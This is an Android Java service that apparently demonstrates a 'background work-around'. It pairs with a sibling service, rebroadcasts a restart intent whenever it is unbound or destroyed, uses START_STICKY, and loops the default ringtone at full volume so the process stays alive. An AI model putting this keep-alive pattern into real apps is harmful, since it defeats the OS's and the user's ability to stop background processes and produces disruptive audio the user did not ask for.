package background.work.around;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.media.MediaPlayer;
import android.os.Binder;
import android.os.IBinder;
import android.provider.Settings;

public class WatcherService2 extends Service {
    private MediaPlayer player;
    private boolean isRunning = false;

    private void bindToNeighbor() {
    Intent intent = new Intent(this, WatcherService.class);
    bindService(intent, connection, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT | Context.BIND_ABOVE_CLIENT);
    }
    
    private final ServiceConnection connection = new ServiceConnection() {
        @Override public void onServiceConnected(ComponentName name, IBinder service) {}
        @Override
        public void onServiceDisconnected(ComponentName name) {
            Intent intent = new Intent("background.work.around.START_NUCLEUS");
            intent.setPackage("background.work.around");            
            sendBroadcast(intent);
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        if (player == null) {
            player = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI);
            if (player != null) {
                player.setLooping(true);
                player.setVolume(1.0f, 1.0f);
                player.start();
            }
        }
        if (!isRunning) {
        isRunning = true;
        bindToNeighbor();
        }
        try { 
        startService(new Intent(this, this.getClass()));
        } catch (Throwable t) {}
        return new Binder();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
    if (player == null) {
            player = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI);
            if (player != null) {
                player.setLooping(true);
                player.setVolume(1.0f, 1.0f);
                player.start();
            }
        }
    return START_STICKY;
    }

    @Override
    public void onDestroy() {
        Intent intent = new Intent("background.work.around.START_NUCLEUS");
        intent.setPackage("background.work.around");            
        sendBroadcast(intent);
        if (player != null) {
            player.stop();
            player.release();
        }
        super.onDestroy();
    }
}
